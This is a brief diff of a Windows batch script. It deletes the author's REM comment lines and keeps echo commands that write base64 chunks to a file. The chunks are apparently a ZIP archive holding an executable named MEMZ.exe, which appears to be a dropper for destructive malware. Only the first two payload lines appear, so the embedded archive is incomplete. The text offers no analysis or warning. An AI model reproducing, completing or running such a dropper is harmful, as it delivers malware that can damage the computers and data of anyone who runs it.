@@ -1,6 +1,4 @@
 @echo off
-REM Phoenixthrush
-REM phoenixthrush.github.io
 
 echo UEsDBBQAAAAIAHV36kiQ6IfZcyEAAAA6AAAIAAAATUVNWi5leGXtew10U8e17kg6soUtjACbGGzi>x
 echo AxgMyD9Hlm1sY4JkW2AH/wjLP5BgB9k6RhKSjqIfbKcJyBgaqw65tM1NIJckNE1705Tcpi3JJWma>>x
